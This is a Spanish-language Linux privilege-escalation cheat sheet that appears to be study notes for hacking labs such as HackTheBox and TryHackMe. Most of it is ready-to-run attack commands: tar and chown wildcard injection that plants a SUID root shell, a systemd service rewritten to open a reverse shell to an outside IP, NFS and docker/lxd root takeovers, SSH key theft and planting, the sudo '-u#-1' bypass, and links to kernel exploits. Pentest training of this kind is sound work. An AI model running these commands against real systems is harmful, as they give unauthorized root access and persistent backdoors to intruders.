Wildacrd o comodin es un carácter o conjunto de caracteres que se puede utilizar como reemplazo de algún rango / clase de caracteres. El shell interpreta los comodines antes de realizar cualquier otra acción.

Algunos caracteres comodines:

* * Un asterisco coincide con cualquier número de caracteres en un nombre de archivo, incluido ninguno.

 * ?  El signo de interrogación coincide con cualquier carácter.

* [] Los corchetes encierran un conjunto de caracteres, cualquiera de los cuales puede coincidir con un solo carácter en esa posición.

 * -  Un guion dentro de [] denota un rango de caracteres.

* ~ Una tilde al principio de una palabra se expande hasta el nombre de su directorio personal. Agregue el nombre de inicio de sesión de otro usuario al carácter, se refiere al directorio de inicio de ese usuario.

ejemplo basico:

```bash
cd /Desktop 
mkdir wild 
cd wild 
echo "Hello Friends" > file1 
echo "This is Wildcard Injection" > file2 
echo "take help" > --help
```

Creamos 3 archivos, vemos que el ultimo tiene un nombre muy peculiar. Si intentamos leerlo nos saldra la ayuda del comando cat.

```bash
cat --help
[menu de ayuda]
```

este tipo de truco se llama Wildacrd wildness.

### secuestro del propietario a traves de chown y chmod

el comando chown se usa para cambiar el propietario de un archivo, tiene una propiedad llamada **--reference** que se lo iguala a una archivo y el o los archivos que tienen ese parametro mas chown adquieren el propietario y grupo del valor de **--reference**

Vamos a ver un ejemplo:

tenemos lo siguiente:

```bash
ls -la

drwxrwxrwx	2 root	root	4096 Jun 12 22.:20 .
drwxrwxrwx 21 bad	bad	4096 Jun 12 22.:20 ..
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 1.php
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 2.php
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 3.php
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 4.php
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 5.php
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 6.php
```

nos creamos 2 archivos.

```bash
echo "" > my.php
echo > --reference=my.php
```

Este ultimo es el que contiene los wildcard

```bash
ls -la

drwxrwxrwx	2 root	root	4096 Jun 12 22.:20 .
drwxrwxrwx 21 bad	bad	4096 Jun 12 22.:20 ..
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 1.php
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 2.php
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 3.php
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 4.php
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 5.php
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 6.php
-rw-rw-r--  1 chris chris	  23 Jun 12 22.:20 my.php
-rw-rw-r--  1 chris chris	  23 Jun 12 22.:20 --reference=my.php
```

ahora si ejecutamos el siguiente comando para asigna un usuario y grupo cualquiera.

```bash
chown -R luis:luis *.php
```

Se ejecutar un chown recursivo para todos los archivos php asignando a luis como usuario y grupo, pero cuando llega al ultimo archivo se ejecuta esto por detras:

**–Referencia = RFILE** (use el propietario y el grupo de RFILE en lugar de especificar los valores OWNER: GROUP)

Dando como resultado:

```bash
ls -la

drwxrwxrwx	2 root	root	4096 Jun 12 22.:20 .
drwxrwxrwx 21 bad	bad	4096 Jun 12 22.:20 ..
-rw-rw-r--  1 chris chris	  23 Jun 12 22.:20 1.php
-rw-rw-r--  1 chris chris	  23 Jun 12 22.:20 2.php
-rw-rw-r--  1 chris chris	  23 Jun 12 22.:20 3.php
-rw-rw-r--  1 chris chris	  23 Jun 12 22.:20 4.php
-rw-rw-r--  1 chris chris	  23 Jun 12 22.:20 5.php
-rw-rw-r--  1 chris chris	  23 Jun 12 22.:20 6.php
-rw-rw-r--  1 chris chris	  23 Jun 12 22.:20 my.php
-rw-rw-r--  1 chris chris	  23 Jun 12 22.:20 --reference=my.php
```

**Esto tambien es valido con chmod y el parametro --reference para asignar los permisos de un archivo**

```bash
chmod --reference=reference_file file
```

Se puede jugar con enlaces simbolicos para apuntar a otros archivos desde otras carpetas.

```bash
ln -s /etc/passwd passwd
```

[Maquina Shrek HTB](https://medium.com/secjuice/hackthebox-shrek-writeup-46b8907fbc43)

### secuestro del propietario a traves de tar

imaginemos que dentro de `/home/user` hay una tarea cron que ejecuta lo siguiente:

```bash
cd /var/www/html #path vulnerable
tar czf /tmp/backup.tar.gz *
```

dentro de esa ruta hacemos lo siguiente:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /var/www/html/runme.sh

touch /var/www/html/--checkpoint=1

touch /var/www/html/--checkpoint-action=exec=sh\ runme.sh

```

despues de esperar hasta que la tarea cron se ejecute podemos lanzar una shell como root:

```bash
/tmp/bash -p
```

[Wildcards Tar](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)

## SERVICE SUDO MISCONFIGURATION

Si en caso de tener la ejecucion como sudo lo siguiente:

```bash
sudo -l

# (ALL : ALL) /usr/sbin/service vsftpd restart
```

y de tener acceso de escritura en el servicio afectado (vsftpd), podemos aprovecharnos de eso:

verificacion de la ruta del servicio.

```bash
systemctl status vsftpd

# ...loaded (/lib/systemd/system/vsftpd.service; enabled;
```

```bash
ls -la /lib/systemd/system/vsftpd.service
```

si podemos escribir agregamos o reemplazamos lo siguiente:

```bash
nano /lib/systemd/system/vsftpd.service

...
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.18.61.164/4646 0>&1"
User=root
...
```

ahora ejecutamos el servicio modificado:

```bash
systemctl deamon-reload #para que no de errores

sudo /usr/sbin/service vsftpd restart
```

y tendremos una conexion reversa

**fuente y practicar**

- [https://tryhackme.com/room/ide](https://tryhackme.com/room/ide)
- [https://gtfobins.github.io/gtfobins/systemctl/](https://gtfobins.github.io/gtfobins/systemctl/)
- [https://jayngng.github.io/blog/ide-thm/](https://jayngng.github.io/blog/ide-thm/)

## Explotacion de kernel

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### CVE-2010-3904 (RDS)

**Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8**

```bash
https://www.exploit-db.com/exploits/15285/
```

### CVE-2010-4258 (Full Nelson)

**Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)**

```bash
https://www.exploit-db.com/exploits/15704/
```

### CVE-2012-0056 (Mempodipper)

**Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)**

```bash
https://www.exploit-db.com/exploits/18411
```

Ruta de los exploit precompilados:

* [bin-sploits - @offensive-security](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)
* [kernel-exploits - @lucyoa](https://github.com/lucyoa/kernel-exploits/)

## # CVE-2021-3156: Heap-Based Buffer Overflow in Sudo (Baron Samedit)

[https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)

Puede comprobar que su versión de sudo es vulnerable con: `$ sudoedit -s Y`. Si solicita su contraseña, lo más probable es que sea vulnerable, si imprime información de uso, no lo es. Puede cambiar a la versión vulnerable en Ubuntu 20.04 con fines de prueba con`$ sudo apt install sudo=1.8.31-1ubuntu1`

- [https://github.com/CptGibbon/CVE-2021-3156](https://github.com/CptGibbon/CVE-2021-3156)
- [https://github.com/0xdevil/CVE-2021-3156](https://github.com/0xdevil/CVE-2021-3156)
- [https://syst3mfailure.io/sudo-heap-overflow](https://syst3mfailure.io/sudo-heap-overflow)


## CVE-2021-4034 (Pwnkit)

[https://github.com/berdav/CVE-2021-4034](https://github.com/berdav/CVE-2021-4034)

```bash
git clone ...
cd CVE-2021-4034
make
./CVE-2021-4034
```


## NFS Root squashing

Cuando aparece **no_root_squash** en el archivo `/etc/exports` , la carpeta que lo tiene se puede compartir y se puede tener los privilegios de root en ella, para ello creamos una montura en nuestro equipo local que haga referencia a la carpeta con ese atributo:

podemos comprobar remotamente el nombre de la carpeta:

```bash
showmount -e 10.10.10.10
```

(lo creamos en /tmp/nfs de nuestro local)
(la carpeta que tiene el atributo `no_root_squash` es **tmp**)

```bash
mkdir /tmp/nfs
mount -o rw,vers=2 <IP_VICTIMA>:/tmp /tmp/nfs

ó

mount -t nfs <IP_VICTIMA>:/tmp /tmp/nfs
```

Creamos un archivo **.elf** malicioso en la montura:

```bash
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf

msfvenom -p linux/x64/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

o podemos crear directamente un binario:

```bash
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c

gcc /tmp/1/x.c -o /tmp/1/x

chmod +s /tmp/1/x
```

le damos permisos SUID:

```bash
chmod +xs /tmp/nfs/shell.elf
```

ahora en la maquina victima podemos ejecutarlo:

```bash
./tmp/shell.elf
```

esto hara que se habra una  **/bin/bash** como el usuario Root.


## Docker

Hacemos un id y si el usuario esta en el grupo dockers (999) es que hay un docker.

Al igual si vemos muchas interfaces de red que puede ser de varias imagenes docker.

ver imagenes de docker:

```bash
docker images
```

ver contenedores:

```bash
docker ps
```

Acceder a un contenedor con modo interactivo:

```bash
docker exec -it <contenedor> bash
```


### Montura (mount)

Si estamos en el grupo docker o lxd podemos obtener una interaccion con un contenedor como Root, la idea es crear una montura de la raiz (/) del sistema operativo padre (host) dentro de la ruta /mnt de un contenedor en el accedemos como Root y poder leer el archivo root/home/root.txt.

Obviamente podemos hacer mas cosas.

```bash
docker run -v /:/mnt/ -i -t <nombre_contenedor> bash

cd /mnt/root/root.txt
```


### LXC / LXD

En caso de tener los permisos docker o lxd pero no hay ningun contenedor puede crearse un contenedor liviano como alphine.

Cree una imagen de Alpine e iníciela usando la bandera **security.privileged=true**, lo que obliga al contenedor a interactuar como raíz con el sistema de archivos del host.

desde kali:

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
./build-alpine -a i686
```

pasamos el archivo **.tar** generado a la victima y ejecutamos lo siguiente:

```bash
# import the image
lxc image import ./alpine.tar.gz --alias myimage

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

[https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)

### PRACTICA

GTFOBins con alphine y montura:

[https://gtfobins.github.io/gtfobins/docker/](https://gtfobins.github.io/gtfobins/docker/)

```bash
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```


- [Maquina Olympus HTB](https://www.youtube.com/watch?v=vMfv7aUj9ak&list=PLlb2ZjHtNkphBtATHv-CZQ-qABlVhINx9&index=2)
- [https://tryhackme.com/room/chillhack](https://tryhackme.com/room/chillhack) (docker)
- [https://tryhackme.com/room/gamingserver](https://tryhackme.com/room/gamingserver) (lxd)

## SSH

### LECTURA DE ID_RSA

Es posible que con un LFI, XSS, un SQLi u otro ataque puedas leer el id_rsa de un usuario del servidor. O simplemente por FTP.

puedes conectarte a SSH con usuario y contraseña o proporcionando la llave privada. Normalmente cuando se crean las llaves ssh con el comando:

```
ssh-keygen
```

Esto crea dos llaves RSA una publica y otra privada:

- id_rsa: clave privada.
- id_rsa.pub: clave publica.

Y normalmente se puede encontrar una o ambas en las siguientes rutas:

```
/home/username/.ssh/id_rsa
~/.ssh/id_rsa
```

donde username es un usuario del sistema. (pueden comprobar en el /etc/passwd).

o buscarlo:

```bash
find / -name authorized_keys 2> /dev/null

find / -name id_rsa 2> /dev/null
```

Si lo consigues y puedes ver el contenido dice que tipo de clave es tambien:

![private key](https://raw.githubusercontent.com/kriko69/Pentesting/master/hacking_web/images%20ssh%20to%20rce/1.png)

Lo pasamos a nuestro equipo de atacante y le asignamos el siguiente permiso:

```
chmod 600 id_rsa
```

supongamos que es la id_rsa del usuario pepito, ahora nos podemos conectar al servidor usando su id_rsa **(siempre y cuando esa id_rsa se encuentre en la carpeta de authorized_keys)**:

```
ssh pepito@10.10.10.123 -i id_rsa -p 22
```

### MODIFICACION DEL AUTHORIZED_KEYS

O quizas hayas conseguido una conexion reversa con un exploit y quieras conectarte por ssh a un equipo.

Puedes generar las llaves RSA de ssh:

```
ssh-keygen
```

puede salir uno de los siguientes mensajes:

```
Generating public/private rsa key pair.
Enter file in which to save the key (/home/username/.ssh/id_rsa):
```

```
/home/username/.ssh/id_rsa already exists.
Overwrite (y/n)?
```

Si elige sobrescribir la clave en el disco, ya **no** podrá autenticar usando la clave anterior. Tenga mucho cuidado al convalidar la operación, ya que este es un proceso destructivo que no puede revertirse.

A continuación, se le solicitará que introduzca una frase de contraseña para la clave. Esta es una frase de contraseña opcional que puede usarse para cifrar el archivo de clave privada en el disco. (Puede dejarlo en blanco)

```
Created directory '/home/username/.ssh'.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
```

Ahora dispondrá de una clave pública y privada que puede usar para realizar la autenticación. El siguiente paso es ubicar la clave pública en su servidor, a fin de poder utilizar la autenticación basada en la clave SSH para iniciar sesión.

```
Your identification has been saved in /home/username/.ssh/id_rsa.
Your public key has been saved in /home/username/.ssh/id_rsa.pub.
The key fingerprint is:
a9:49:2e:2a:5e:33:3e:a9:de:4e:77:11:58:b6:90:26 username@remote_host
The key's randomart image is:
+--[ RSA 2048]----+
|     ..o         |
|   E o= .        |
|    o. o         |
|        ..       |
|      ..S        |
|     o o.        |
|   =o.+.         |
|. =++..          |
|o=++.            |
+-----------------+
```

Ahora tenemos una clave publica y otra privada, vamos a crear un archivo llamado **authorized_keys**, dentro de la carpeta **.ssh** que es tambien donde estan nuestras llaves, donde vamos a agregar la clave publica. Este archivo va a dejar autorizar a todo aquel que proporcione su clave par (privada) a la hora de autenticarse.

```
touch authorized_keys

cat id_rsa.pub

echo "id_rsa.pub output" > authorized_keys
```

Y con eso deberiamos copiarnos la llave privada a nuestra maquina de atacantes, darle el permiso 600 y autenticarnos:

```
chmod 600 id_rsa

ssh -i id_rsa pepito@10.129.112.108

<enter>

<colocamos el passphrase>
```

## SUDO VULNERABILITY (CVE-2019-14287)

Sudo es un programa dedicado al sistema operativo Linux, o cualquier otro sistema operativo similar a Unix, y se usa para delegar privilegios. Por ejemplo, puede ser utilizado por un usuario local que desee ejecutar comandos como raíz, el equivalente de Windows del usuario administrador.

todas las versiones de Sudo anteriores a la versión 1.8.28 se ven afectadas:

```bash
sudo -v
```

La falla de seguridad podría permitir que un usuario malintencionado ejecute comandos arbitrarios como usuario raíz, incluso en los casos en que no se permite el acceso raíz.

la vulnerabilidad es relevante en una configuración específica en la política de seguridad de Sudo, llamada "sudoers", que ayuda a garantizar que los privilegios se limiten solo a usuarios específicos. 

El problema ocurre cuando un administrador de sistemas inserta una entrada en el archivo sudoers, por ejemplo:

```bash
jacob myhost = (ALL, !root) /usr/bin/chmod
```

Esta entrada significa que el usuario jacob puede ejecutar "chmod" como cualquier usuario, excepto el usuario raíz, lo que significa que existe una política de seguridad para limitar el acceso.

al hacer **sudo -l** con el usuario saldra algo asi:

```bash
(ALL, !root) NOPASSWD: /usr/bin/chmod
```

Desafortunadamente, Joe Vennix de Apple Information Security descubrió que la función no puede analizar todos los valores correctamente y al proporcionar el ID de usuario del parámetro "-1" o su número sin firmar "4294967295", el comando se ejecutará como raíz, sin pasar por la entrada de la política de seguridad. establecido en el ejemplo anterior.

En el siguiente ejemplo, cuando ejecutamos el ID de usuario "-1", obtenemos el número de ID "0", que es el valor del usuario raíz (ROOT):

#### POC

```bash
sudo -u#-1 id -u

#0
```

entonces esto nos ayudaria a ejecutar programas como root siempre y cuando esten en el sudoers, con la siguiente regla nos permitia ejecutar chmod como otro usuario que no es root:

```bash
jacob myhost = (ALL, !root) /usr/bin/chmod
```

pero esto lo podemos evadir de la siguiente manera:

```bash
sudo -u#-1 /usr/bin/chmod ...
```

### mitigacion

**asegúrese de actualizar a la versión 1.8.28 o superior de sudo.**

### EJEMPLO

- [https://muirlandoracle.co.uk/2020/03/10/year-of-the-rabbit-write-up/](https://muirlandoracle.co.uk/2020/03/10/year-of-the-rabbit-write-up/)
- [https://www.whitesourcesoftware.com/resources/blog/new-vulnerability-in-sudo-cve-2019-14287/](https://www.whitesourcesoftware.com/resources/blog/new-vulnerability-in-sudo-cve-2019-14287/)

### PRACTICA
- [https://tryhackme.com/room/yearoftherabbit](https://tryhackme.com/room/yearoftherabbit)


## DIRTY PIPE ( CVE-2022-0847)

Esta es la historia de CVE-2022-0847, una vulnerabilidad en el kernel de Linux desde 5.8 que permite sobrescribir datos en archivos arbitrarios de solo lectura. Esto conduce a una escalada de privilegios porque los procesos sin privilegios pueden inyectar código en los procesos raíz.

Es similar a [CVE-2016-5195 “Dirty Cow”](https://dirtycow.ninja/) , pero es más fácil de explotar.

La vulnerabilidad [se corrigió](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9d2231c5d74e13b2a0546fee6737ee4446017903) en Linux 5.16.11, 5.15.25 y 5.10.102.

- [https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit](https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit)

## TECNICAS

- [https://chryzsh.gitbooks.io/pentestbook/content/privilege_escalation_-_linux.html](https://chryzsh.gitbooks.io/pentestbook/content/privilege_escalation_-_linux.html)

## ESCALADAS DE PRIVILEGIOS INTERESANTES

- [https://tryhackme.com/room/overpass](https://tryhackme.com/room/overpass)
- [https://tryhackme.com/room/yearoftherabbit](https://tryhackme.com/room/yearoftherabbit)